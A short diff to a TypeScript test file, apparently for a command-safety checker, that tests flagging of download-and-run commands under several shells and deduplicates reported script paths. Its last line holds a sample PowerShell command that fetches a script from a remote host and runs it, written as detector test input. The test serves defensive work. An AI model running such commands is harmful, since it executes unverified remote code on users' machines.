@@ -3271,7 +3271,8 @@ describe("commands held to main at 4d64d3a: no way of reading one decides less s
       for (const [shell, context] of [["bash", "linux"], ["zsh", "darwin"], ["sh", "linux"]] as const) {
         const c = got(cmd, shell, context);
         expect(c.findings.map(f => f.rule), `${cmd} (${shell})`).toContain("escape.run-downloaded");
-        expect(c.scripts.map(r => r.path), `${cmd} (${shell})`).toEqual([`${context === "darwin" ? "/Users/ana/proj" : P}/s.sh`]);
+        // (Once as the script it runs, and maybe again as code a program Ember doesn't know is handed: r11-commands-y11-3.)
+        expect([...new Set(c.scripts.map(r => r.path))], `${cmd} (${shell})`).toEqual([`${context === "darwin" ? "/Users/ana/proj" : P}/s.sh`]);
       }
     }
     const ps = got("curl.exe --rate -o s.ps1 https://e.com/x; .\\s.ps1", "powershell", "win32");
